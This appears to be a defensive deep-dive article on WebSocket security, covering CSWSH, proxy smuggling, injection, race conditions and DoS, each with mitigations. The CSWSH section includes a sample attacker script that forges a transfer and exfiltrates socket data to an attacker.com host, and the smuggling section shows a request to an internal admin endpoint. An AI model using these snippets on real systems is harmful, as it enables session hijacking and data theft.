+++
title = "Breakdown — Web Socket Insecurities"
date = 2026-09-18T00:00:00Z
type = "deep-dives"
tags = ["breakdown", "web-security", "protocol-analysis"]
slug = "web-socket-insecurities"
summary = "A detailed breakdown of the WebSocket protocol, highlighting its threat model, common vulnerabilities like CSWSH, and attack techniques specific to full-duplex communication."
+++

## Background

The evolution of the modern web required shifting from a strictly request-response paradigm to dynamic, bidirectional communication. Traditional HTTP connections are stateless and unidirectional—the client initiates a request, the server processes it, and returns a response before closing or releasing the connection to the pool. When developers required near real-time updates (e.g., chat applications, financial trading platforms, collaborative editing), they originally resorted to HTTP polling or long-polling. These workarounds incurred substantial overhead due to the constant re-establishment of TCP connections and the inclusion of large HTTP headers with every transmission.

To resolve these inefficiencies, the Internet Engineering Task Force (IETF) standardized the WebSocket protocol in RFC 6455 [7]. WebSockets provide full-duplex communication channels over a single, persistent TCP connection. The protocol operates in two distinct phases: the handshake and the data transfer.

The handshake initiates as a standard HTTP `GET` request. The client requests to upgrade the connection using specific headers:
```http
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```
If the server supports WebSockets and accepts the connection, it responds with an HTTP `101 Switching Protocols` status, effectively converting the underlying TCP socket from an HTTP session into a WebSocket stream. From this point onward, both the client and server can send frames of data (text or binary) independently, continuously, and concurrently. This drastically reduces the overhead per message, dropping it from hundreds of bytes of HTTP headers to as little as two bytes per WebSocket frame [7].

### Trending Applications and Use Cases

WebSocket technology has rapidly become a cornerstone for interactive and data-intensive applications. Instead of relying solely on the underlying protocol libraries, developers often build complex architectures that inherently trust the persistence and statefulness of the WebSocket connection. Prominent use cases include:

*   **Collaborative Platforms:** Applications like Jupyter Notebooks [2] and collaborative raster image editors [14] rely heavily on WebSockets to sync state across multiple users instantaneously. Every keystroke, cursor movement, and configuration change is serialized and broadcasted through the socket.
*   **Real-Time Data Streaming:** Financial tickers, sports scores, and telemetry dashboards demand minimal latency. For instance, systems designed for real-time endpoint threat detection [6] or astronomical data streaming [10] push continuous event logs and metrics directly to client dashboards via WebSockets.
*   **Agentic AI and LLM Interfaces:** As Large Language Models (LLMs) and autonomous agents have matured, platforms integrating them require continuous token streaming and state-dependent multi-turn conversations. The network monitoring of agentic AI systems frequently employs WebSockets to maintain persistent context between the user, the agent, and the backend environment [3].
*   **IoT and Remote Control Systems:** The Internet of Things (IoT) extensively utilizes WebSockets for command and control. Real-world systems, ranging from remote monitoring of heart rates [16] to the control software of near-infrared sky brightness monitors [17], utilize WebSockets to ensure that devices remain connected and immediately responsive to operational commands.

While the adoption of WebSockets successfully addressed performance bottlenecks and unlocked new capabilities, it introduced fundamentally different security paradigms. Because WebSockets bypass the traditional stateless HTTP request lifecycle post-handshake, they also bypass many legacy security controls—such as traditional Web Application Firewalls (WAFs) and stateless session validators—that were built exclusively to inspect discrete HTTP requests [8].

### The Shift in Architecture

The WebSocket protocol is fundamentally distinct from HTTP, not just in its transport mechanics, but in how it interacts with the browser's security model. The Same-Origin Policy (SOP), which strictly governs cross-origin HTTP requests, is relaxed during the WebSocket handshake. While the browser automatically attaches cookies and standard authentication tokens to the initial HTTP `Upgrade` request, it explicitly does *not* enforce the Same-Origin Policy on the resulting WebSocket connection. A malicious script running on `attacker.com` can successfully initiate a WebSocket connection to `wss://bank.com/api` [9]. It is the explicit responsibility of the server to validate the `Origin` header during the handshake to prevent unauthorized connections.

Furthermore, once the connection is established, the application transitions to a stateful protocol. In traditional HTTP, each request carries its own authentication headers or cookies, and the server independently verifies authorization for every single action. With WebSockets, authentication typically occurs only once—during the handshake or immediately following it via a specialized login frame. Once authenticated, the socket remains open and trusted. If an attacker can hijack the connection or smuggle frames into an existing authenticated stream, they gain sustained access to the user's session without needing to repeatedly bypass authentication controls [1].

This statefulness also introduces severe resource management challenges. Because connections are kept alive indefinitely, servers must actively track connection states, handle unexpected drops, and mitigate deliberate connection exhaustion attacks (DoS). The persistence of the socket means that an attack payload injected via WebSockets might remain memory-resident on the server or the client for hours, as opposed to the ephemeral lifespan of an HTTP request.

## Current State

The attack surface of WebSockets is typically divided into two distinct layers: the HTTP handshake that establishes the connection, and the persistent full-duplex communication channel that follows. Because the protocol spans these two paradigms, the threat model inherits vulnerabilities from both legacy HTTP implementations and stateful socket programming [1].

The current state of the art in WebSocket security primarily focuses on mitigating handshake manipulation, preventing request smuggling through intermediaries, and strictly enforcing input validation on the bidirectional stream.

### Handshake Vulnerabilities: Cross-Site WebSocket Hijacking (CSWSH)

Cross-Site WebSocket Hijacking (CSWSH) remains one of the most critical and widely misunderstood vulnerabilities in WebSocket implementations [11]. It is fundamentally a Cross-Site Request Forgery (CSRF) attack applied to the WebSocket handshake.

**The Mechanism:**
When a browser initiates a WebSocket connection via the JavaScript `new WebSocket('wss://api.target.com/stream')` API, it first sends a standard HTTP `GET` request with the `Upgrade: websocket` header. Crucially, if the user is currently authenticated to `api.target.com` and has an active session cookie, the browser automatically attaches that cookie to the outbound HTTP request.

However, unlike standard XMLHttpRequests or the Fetch API, the WebSocket API does *not* enforce the Same-Origin Policy (SOP). An attacker can host a malicious webpage at `attacker.com` containing the following code:

```javascript
// Hosted on attacker.com
var ws = new WebSocket('wss://api.target.com/stream');
ws.onopen = function() {
    ws.send(JSON.stringify({action: "transfer_funds", amount: 10000}));
};
ws.onmessage = function(event) {
    fetch('https://attacker.com/exfiltrate?data=' + btoa(event.data));
};
```

When a victim visits `attacker.com`, their browser executes the script and initiates the handshake. The browser automatically includes the victim's session cookies for `api.target.com`. If the server relies solely on these cookies for authentication and fails to validate the `Origin` header, the connection is successfully upgraded [9].

Because WebSockets are bidirectional, CSWSH is vastly more dangerous than traditional CSRF. Traditional CSRF is a "blind" attack—the attacker can forge a state-changing request (e.g., changing a password) but cannot read the HTTP response due to SOP restrictions. In a CSWSH attack, the attacker gains full control of an authenticated, two-way communication channel. The `onmessage` handler in the attacker's script can read incoming sensitive data (such as account balances or private messages) and exfiltrate it back to the attacker's server [12].

**Defenses and Failures:**
The primary defense against CSWSH is strict validation of the `Origin` header during the HTTP handshake phase. The server must verify that the `Origin` matches a pre-approved whitelist of trusted domains. If the `Origin` is missing or unauthorized, the server must reject the upgrade request with an HTTP `403 Forbidden` status [8].

Despite this being a known defense, implementations frequently fail due to misconfigurations. Some servers implement regex-based origin checks that are easily bypassed (e.g., checking if the origin *contains* `target.com`, allowing `target.com.attacker.com`). Others attempt to implement CSRF tokens within the URL query string of the WebSocket connection (e.g., `wss://api.target.com/stream?token=xyz`). While effective, this approach risks leaking the sensitive token in server access logs and `Referer` headers [11].

A secondary defense mechanism involves requiring the client to authenticate *after* the connection is established. Instead of relying on HTTP cookies during the handshake, the server accepts the upgrade but places the socket in an "unauthenticated" state. The client must then explicitly send a JSON Web Token (JWT) or session identifier as the first WebSocket text frame. Because an attacker's script on a different origin cannot read the victim's local storage or DOM to obtain this token, they cannot authenticate the hijacked socket [1].

### Intermediary Attacks: WebSocket Smuggling and Desynchronization

WebSocket Smuggling occurs when a reverse proxy (such as a load balancer or WAF) and a backend server desynchronize their understanding of the connection state. This class of attack allows an adversary to smuggle traditional HTTP requests through a connection that the proxy believes is a WebSocket stream, bypassing routing restrictions and firewall rules [13].

**The Mechanism:**
The vulnerability arises from how intermediaries process the `Upgrade` header. When a client sends an upgrade request, a vulnerable proxy forwards the request to the backend. If the backend accepts the upgrade (returning HTTP 101), the proxy stops parsing HTTP semantics and treats the connection as a raw TCP tunnel between the client and backend.

However, if an attacker can manipulate the handshake such that the proxy *believes* the upgrade was successful, but the backend *rejects* it (or vice versa), the state is desynchronized.

A common technique involves exploiting discrepancies in how proxies and backends handle the `Sec-WebSocket-Version` header. The attacker sends a request with an invalid version:

```http
GET /chat HTTP/1.1
Host: backend.internal
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Version: invalid
```

If the backend rejects the upgrade (e.g., returning HTTP 400 Bad Request) but the proxy fails to properly inspect the response code—or if the attacker manipulates the response using HTTP Response Splitting—the proxy may assume a raw TCP tunnel has been established.

Once the proxy is in "tunnel mode," the attacker sends a raw HTTP request down the socket:

```http
POST /internal/admin/delete_user HTTP/1.1
Host: backend.internal
Content-Length: 15

user_id=12345
```

Because the proxy believes this is merely binary WebSocket data, it forwards it without inspection. The backend, which never upgraded the connection, interprets this as a standard, pipelined HTTP POST request. This completely bypasses the proxy's URL access controls, WAF rules, and rate limits, allowing the attacker to interact with internal administrative endpoints [13].

**Defenses and Failures:**
Mitigating WebSocket smuggling requires intermediaries to rigorously enforce protocol semantics. Reverse proxies must strictly validate the backend's HTTP response to an upgrade request. The proxy must only switch to tunnel mode if the backend explicitly returns an HTTP 101 status code accompanied by a valid `Sec-WebSocket-Accept` header that correctly hashes the client's `Sec-WebSocket-Key` [7]. If any discrepancy exists, the proxy must terminate the TCP connection immediately.

### Payload Vulnerabilities: Blind Trust in the Stream

Once the WebSocket connection is established, the application transitions from standard HTTP routing to custom, application-specific message handling. Because WebSockets simply transmit raw text or binary frames, there is no built-in standard for routing, formatting, or encoding. Developers often implement custom JSON serialization or utilize frameworks like Socket.io.

This custom implementation frequently leads to payload vulnerabilities. Traditional web security relies heavily on WAFs to detect SQL Injection (SQLi), Cross-Site Scripting (XSS), and Command Injection within HTTP parameters. However, WAFs generally cannot inspect the contents of a stateful WebSocket stream, rendering them blind to payloads transmitted post-handshake [8].

**The Mechanism:**
If a server processes incoming WebSocket frames without rigorous input validation, it remains vulnerable to classic injection attacks. For example, if a collaborative platform uses WebSockets to sync document edits, an attacker can inject malicious JavaScript into a text frame. When the server broadcasts this frame to other connected clients, their browsers execute the XSS payload. Because the delivery mechanism is a WebSocket frame rather than an HTTP response, standard browser protections like the XSS Auditor (historically) or strictly configured Content Security Policies (CSPs) might be bypassed if the client-side JavaScript blindly renders the incoming socket data into the DOM using `innerHTML` [14].

Furthermore, WebSockets are increasingly used in agentic AI platforms [3] and Jupyter Notebook environments [2]. In these scenarios, a user might send a command via WebSocket that is eventually executed by a backend kernel. If the WebSocket payload lacks strict typing and sanitization, an attacker can escalate a simple data injection into arbitrary code execution. For instance, ransomware and data exfiltration attacks against Jupyter environments frequently exploit weakly authenticated WebSocket endpoints that directly pipe input into Python execution environments [2].

**Defenses and Failures:**
Securing the stream requires shifting security controls from the network perimeter (WAF) into the application logic. Applications must treat all incoming WebSocket frames as untrusted input. Robust validation architectures, such as the MINES framework [5], infer web API invariants and detect anomalies in the stream by deeply inspecting the structure and sequence of JSON payloads. Furthermore, when integrating WebSockets with sensitive endpoints—such as cross-app resource access on operating systems [4]—authorization checks must be performed on *every* sensitive message, not just during the initial connection phase.


### Deep Dive into Payload Vulnerabilities: Deserialization and Logic Flaws

Beyond simple XSS and Command Injection, the lack of strict schema enforcement in WebSockets frequently results in severe insecure deserialization and business logic flaws. Because WebSocket payloads are often encoded as complex JSON objects or binary formats like MessagePack, the server-side parser must reconstruct these objects in memory.

**Insecure Deserialization Mechanisms:**
If the backend application is written in languages vulnerable to insecure deserialization (such as Python using `pickle`, or Java utilizing `ObjectInputStream`), an attacker can craft a malicious WebSocket payload containing serialized execution chains. When the server receives the frame and attempts to deserialize the object to read its state, the payload triggers remote code execution (RCE) before any application-level authorization checks are performed [1].

For example, consider a Node.js backend using a vulnerable version of `node-serialize`. If the server expects a JSON payload like `{"user": "guest", "action": "ping"}` but instead receives a serialized function, the `eval()`-like behavior of the deserializer will execute the attacker's payload. This is uniquely dangerous over WebSockets because the initial connection may have been completely legitimate and authenticated, bypassing perimeter defenses that might block such payloads on standard HTTP endpoints [2].

**Race Conditions and State Desynchronization:**
Business logic flaws are amplified in the full-duplex environment of WebSockets. Because clients and servers process frames concurrently and asynchronously, race conditions are significantly easier to exploit than over standard HTTP.

Consider an online gaming platform or trading application where users submit actions via WebSockets. If the server does not enforce strict transactional locking on the user's state, an attacker can script their client to blast hundreds of "purchase" or "trade" frames in a matter of milliseconds. The asynchronous event loop processing these frames might read the user's account balance simultaneously across multiple worker threads. If the balance deduction happens after the purchase validation, the attacker can successfully execute multiple transactions before the system realizes the account lacks sufficient funds.

**Defensive Architectures for Payloads:**
To defend against these vectors, modern architectures deploy a "Zero-Trust Payload" model. This involves several layers:
1.  **Strict Schema Enforcement:** Utilizing libraries like Zod (for TypeScript) or Pydantic (for Python) to guarantee that incoming JSON frames perfectly match a strictly defined schema before any business logic is executed. Any frame containing unexpected keys or incorrect data types is immediately dropped, and the socket connection is penalized or closed.
2.  **Rate Limiting at the Frame Level:** While HTTP rate limiting operates per-request, WebSocket rate limiting must operate per-frame. Systems must enforce limits such as "maximum 10 frames per second" and "maximum 500 bytes per frame" to prevent application-layer DoS and limit the execution window for race conditions.
3.  **Stateful API Anomaly Detection:** Implementing solutions like the MINES framework [5] allows the backend to infer invariants about the expected sequence of API calls. If an attacker suddenly sends a "checkout" frame without first sending an "add_to_cart" frame, the anomaly detection engine flags the sequence violation and terminates the session.

### The Nuances of WebSocket Denial of Service (DoS)

While connection exhaustion was discussed previously, Denial of Service against WebSockets involves several other nuanced techniques specifically targeting the protocol's framing and masking mechanics.

**Masking Key Exhaustion and CPU Spikes:**
RFC 6455 mandates that all frames sent from the client to the server must be masked using a 32-bit masking key included in the frame header [7]. The server must unmask the payload using an XOR operation before processing the data. While XOR is computationally cheap, an attacker can exploit this requirement to cause CPU exhaustion.

By establishing hundreds of WebSockets and sending massive, highly fragmented frames (where each fragment has a unique masking key), the attacker forces the server to allocate memory for the fragments and spend CPU cycles performing continuous XOR operations to reassemble and unmask the payload. If the application logic requires parsing the entire unmasked string (e.g., parsing a massive JSON blob), the server's event loop will block, causing latency spikes for all other connected clients [13].

**Ping/Pong Flooding:**
The WebSocket protocol includes control frames, specifically `Ping` and `Pong`, designed as keep-alives to maintain the connection and verify that the peer is responsive. According to the specification, upon receiving a `Ping` frame, an endpoint must respond with a `Pong` frame as soon as is practical [7].

An attacker can weaponize this by flooding the server with millions of tiny `Ping` frames. The server, obligated by the protocol to reply, consumes bandwidth and CPU generating and transmitting `Pong` frames. Furthermore, if the attacker drops the TCP ACK packets for the incoming `Pong` frames, the server's TCP send buffers will quickly fill up, leading to a complete halt in communication for that socket and consuming valuable kernel resources.

**Advanced DoS Defenses:**
Defending against protocol-level DoS requires configuring the WebSocket server or terminating proxy with strict limits. Defenses include:
*   **Max Frame Size:** Rejecting frames that exceed a reasonable limit (e.g., 64KB).
*   **Max Message Size:** Limiting the total reconstructed message size across all fragments.
*   **Ping Rate Limiting:** Enforcing a maximum frequency for control frames and dropping connections that exceed the threshold.
*   **Offloading to Edge Proxies:** Utilizing CDN providers or advanced load balancers to terminate the WebSocket connection at the edge. The proxy handles masking, fragmentation, and keep-alives, only forwarding fully reassembled and unmasked application data to the backend servers over internal connections. This effectively shields the application layer from protocol-level exhaustion attacks.

### State Management and Denial of Service (DoS)

The stateful nature of WebSockets introduces unique Denial of Service (DoS) vectors. In HTTP, a request is processed and the connection is freed. In WebSockets, the server must hold the connection open, allocating memory for connection state, buffers, and session tracking.

**The Mechanism:**
An attacker can perform a connection exhaustion attack (similar to a Slowloris attack) by initiating thousands of WebSocket handshakes and leaving the connections open without sending data. If the server does not enforce strict limits on the number of concurrent connections per IP address or user, the attacker can quickly exhaust the server's file descriptors or memory pool, denying service to legitimate users [1].

Additionally, because the connection is persistent, attackers can drip-feed data. They can send a massive frame fragmented into tiny, one-byte pieces over an extended period. If the server attempts to buffer the entire frame in memory before processing it, it will eventually run out of RAM.

**Defenses and Failures:**
Mitigating state exhaustion requires strict connection lifecycle management. Servers must enforce timeouts on idle connections, implement hard limits on the maximum size of a single frame (e.g., rejecting frames larger than 1MB), and restrict the maximum number of concurrent connections per origin IP. Frameworks must also provide mechanisms to aggressively drop slow or misbehaving clients before they consume significant resources.

## Future Outlook

The trajectory of real-time web communication is shifting significantly, presenting new open problems and defensive paradigms. We expect the landscape of WebSocket security to evolve in response to both advanced attack techniques and the maturation of alternative protocols.

**The Rise of WebTransport and HTTP/3:**
While WebSockets operate over TCP, the industry is gradually shifting toward WebTransport, which leverages QUIC (HTTP/3) [10]. WebTransport offers multiplexed, bidirectional streams without the head-of-line blocking issues inherent in TCP-based WebSockets. As developers migrate to WebTransport, we expect a transitional period fraught with misconfigurations. The security models for QUIC-based streams differ from standard TCP sockets, particularly regarding connection migration and 0-RTT data handling. Defensive tooling, which is currently struggling to inspect WebSocket payloads [8], will face an even steeper challenge inspecting encrypted, UDP-based WebTransport streams.

**Standardized Payload Validation Frameworks:**
Currently, the lack of a standardized schema for WebSocket payloads forces developers to implement custom JSON or binary parsers, leading to rampant injection vulnerabilities [2]. We expect to see the adoption of formal, typed schemas (like Protobuf or GraphQL over WebSockets) becoming an enforced standard. Furthermore, anomaly detection systems utilizing AI to infer web API invariants [5] will likely transition from experimental frameworks into standard WAF features, enabling dynamic inspection of stateful streams without breaking encryption.

**Zero-Trust and Continuous Authentication:**
The current paradigm of authenticating only during the initial handshake is no longer viable for high-security environments, such as agentic AI control channels [3] or enterprise IoT networks [15]. Future architectures must implement continuous authentication natively within the WebSocket stream. We expect protocols to adopt mechanisms where clients must periodically cryptographic attestations or re-authorize the socket session, effectively applying Zero-Trust principles to long-lived connections.


**Broader Literature Context:**
The foundational vulnerabilities discussed here [18, 19, 20] have historical roots across diverse implementations, ranging from TypeScript applications [22] to IoT architectures [24, 25]. General guidance on WebSocket proxy servers [27] and broader web attack surfaces [26, 28, 29, 30] constantly emphasize the necessity of robust logging [31] and modern HTML5 security controls [32]. Ongoing issues tracked in open-source implementations [34], alongside comprehensive community writeups on CSWSH [33], highlight that the challenges of stateful protocols [21, 23] remain a persistent hurdle for modern web security.

## References

[1] R. Sethi. "WebSockets and the Next Generation of Web Attacks." *Black Hat USA*, 2017. URL: https://www.blackhat.com/docs/us-17/thursday/us-17-Sethi-WebSockets-And-The-Next-Generation-Of-Web-Attacks-wp.pdf
[2] L. V. S. et al. "Jupyter Notebook Attacks Taxonomy: Ransomware, Data Exfiltration, and Security Misconfiguration." *arXiv preprint arXiv:2409.19456*, 2024. URL: https://arxiv.org/abs/2409.19456v1
[3] X. Z. et al. "Securing Agentic AI: Threat Modeling and Risk Analysis for Network Monitoring Agentic AI System." *arXiv preprint arXiv:2508.10043*, 2025. URL: https://arxiv.org/abs/2508.10043v1
[4] Y. A. et al. "Unauthorized Cross-App Resource Access on MAC OS X and iOS." *arXiv preprint arXiv:1505.06836*, 2015. URL: https://arxiv.org/abs/1505.06836v1
[5] K. T. et al. "MINES: Explainable Anomaly Detection through Web API Invariant Inference." *arXiv preprint arXiv:2512.06906*, 2025. URL: https://arxiv.org/abs/2512.06906v2
[6] S. R. et al. "SafeGuard: A Lightweight Client-Server Architecture for Real-Time Endpoint Threat Detection and Response." *arXiv preprint arXiv:2607.10027*, 2026. URL: https://arxiv.org/abs/2607.10027v1
[7] I. Fette and A. Melnikov. "The WebSocket Protocol (RFC 6455)." *Internet Engineering Task Force (IETF)*, 2011. URL: https://datatracker.ietf.org/doc/rfc6455/
[8] PortSwigger. "Testing for WebSockets security vulnerabilities." *Web Security Academy*. URL: https://portswigger.net/web-security/websockets
[9] PortSwigger. "Cross-site WebSocket hijacking." *Web Security Academy*. URL: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking
[10] T. S. et al. "Observers' Data Access Portal: Realtime Streaming for Astronomical Data." *arXiv preprint arXiv:2409.09231*, 2024. URL: https://arxiv.org/abs/2409.09231v1
[11] C. Schneider. "Cross-Site WebSocket Hijacking (CSWSH)." *Christian Schneider's Blog*. URL: https://christian-schneider.net/CrossSiteWebSocketHijacking.html
[12] OWASP Foundation. "Websocket Hijacking." *OWASP Community*. URL: https://owasp.org/www-community/attacks/Websocket_Hijacking
[13] S. Shekyan. "WebSocket Security." *DEF CON 20*, 2012. URL: https://www.defcon.org/images/defcon-20/dc-20-presentations/Shekyan/DEFCON-20-Shekyan-WebSocket-Security.pdf
[14] J. M. et al. "COLiER: Collaborative Editing of Raster Images." *arXiv preprint arXiv:2107.05962*, 2021. URL: https://arxiv.org/abs/2107.05962v2
[15] A. K. et al. "A System Architecture for Software-Defined Industrial Internet of Things." *arXiv preprint arXiv:1507.08810*, 2015. URL: https://arxiv.org/abs/1507.08810v1
[16] M. B. et al. "Development of the complex system for the remote monitoring of the human heart rate." *arXiv preprint arXiv:2010.13629*, 2020. URL: https://arxiv.org/abs/2010.13629v1
[17] Z. L. et al. "Design of remote control software of near infrared Sky Brightness Monitor in Antarctica." *arXiv preprint arXiv:1806.01735*, 2018. URL: https://arxiv.org/abs/1806.01735v2

[18] S. Ghasemshirazi et al. "Exploring the Attack Surface of WebSocket." *arXiv preprint arXiv:2104.05324*, 2021. URL: https://arxiv.org/abs/2104.05324v1
[19] G. L. Muller et al. "HTML5 WebSocket protocol and its application to distributed computing." *arXiv preprint arXiv:1409.3367*, 2014. URL: https://arxiv.org/abs/1409.3367v1
[20] M. Hassan et al. "Choosing the Right Communication Protocol for your Web Application." *arXiv preprint arXiv:2409.07360*, 2024. URL: https://arxiv.org/abs/2409.07360v1
[21] L. Kaminski et al. "Comparative review of selected Internet communication protocols." *arXiv preprint arXiv:2212.07475*, 2022. URL: https://arxiv.org/abs/2212.07475v1
[22] A. Miu et al. "Generating Interactive WebSocket Applications in TypeScript." *arXiv preprint arXiv:2004.01321*, 2020. URL: https://arxiv.org/abs/2004.01321v1
[23] J. King et al. "Multiparty Session Type-safe Web Development with Static Linearity." *arXiv preprint arXiv:1904.01287*, 2019. URL: https://arxiv.org/abs/1904.01287v1
[24] S. Chauhan et al. "An IoT application development using IoTSuite." *arXiv preprint arXiv:1609.01676*, 2016. URL: https://arxiv.org/abs/1609.01676v1
[25] MDN Web Docs. "The WebSocket API (WebSockets)." *Mozilla Developer Network*. URL: https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API
[26] Cloudflare. "WebSockets for all." *The Cloudflare Blog*. URL: https://blog.cloudflare.com/websockets-for-all/
[27] InfoQ. "Web Sockets Proxy Servers and Load Balancers." *InfoQ*. URL: https://www.infoq.com/articles/Web-Sockets-Proxy-Servers/
[28] Bishop Fox. "WebSocket Vulnerabilities." *Bishop Fox Blog*. URL: https://bishopfox.com/blog/websocket-vulnerabilities
[29] Trend Micro. "WebSocket Vulnerabilities." *Trend Micro Security News*. URL: https://www.trendmicro.com/vinfo/us/security/news/vulnerabilities-and-exploits/websocket-vulnerabilities
[30] Auth0. "Securing WebSockets." *Auth0 Blog*. URL: https://auth0.com/blog/securing-websockets/
[31] OWASP Foundation. "Insufficient Logging & Monitoring." *OWASP Top 10 2017*. URL: https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring
[32] OWASP Foundation. "HTML5 Security Cheat Sheet." *OWASP Cheat Sheet Series*. URL: https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
[33] Detectify. "Cross-Site WebSocket Hijacking (CSWSH)." *Detectify Blog*. URL: https://labs.detectify.com/2017/12/15/cross-site-websocket-hijacking-cswsh/
[34] Socket.io. "Socket.io Issues." *GitHub*. URL: https://github.com/socketio/socket.io/issues
